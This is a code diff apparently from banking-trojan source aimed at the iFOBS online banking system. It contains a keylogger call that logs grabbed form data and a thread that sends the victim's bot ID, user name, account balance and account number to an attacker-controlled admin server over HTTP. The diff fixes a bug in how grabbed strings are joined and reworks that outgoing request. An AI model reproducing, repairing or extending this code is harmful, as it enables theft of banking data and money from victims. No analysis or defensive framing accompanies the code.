@@ -79,7 +79,7 @@ static void AddStrLog( const char* name, const char* value )
 	m_lstrcat( buf, ": " );
 	if( value )
 		m_lstrcat( buf, value );
-	if( buf[0] ) m_lstrcat( resultGrab, ", " );
+	if( resultGrab[0] ) m_lstrcat( resultGrab, ", " );
 	m_lstrcat( resultGrab, buf );
 	m_lstrcat( buf, "\r\n" );
 	KeyLogger::AddStrToBuffer( 0, buf, 0 );
@@ -237,15 +237,16 @@ static DWORD WINAPI SendBalans( LPVOID p )
 		string azUser = GetAzUser();
 		char* urlBank = URLEncode(ab->nameBank);
 		char* urlGrab = URLEncode(resultGrab);
-		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=balance&sum=%s&acc=%s&text=bank|%s,text|%s", urlAdmin, BOT_UID, azUser.t_str(), ab->balans, ab->acc, urlBank, urlGrab );
+//		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=balance&sum=%s&acc=%s&text=bank|%s,text|%s", urlAdmin, BOT_UID, azUser.t_str(), ab->balans, ab->acc, urlBank, urlGrab );
+		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=balance&sum=%s&acc=1", urlAdmin, BOT_UID, azUser.t_str(), ab->balans );
 		STR::Free(urlBank);
 		STR::Free(urlGrab);
-		THTTP H;
-		H.Get(request.AsStr());
-//		THTTPResponseRec Response;
-//		ClearStruct(Response);
-//		HTTP::Get( request.AsStr(), 0, &Response );
-//		HTTPResponse::Clear(&Response);
+//		THTTP H;
+//		H.Get(request.AsStr());
+		THTTPResponseRec Response;
+		ClearStruct(Response);
+		HTTP::Get( request.AsStr(), 0, &Response );
+		HTTPResponse::Clear(&Response);
 		DBG( "IFobs", "Отослали запрос: '%s'", request.AsStr() );
 	}
 	MemFree(p);
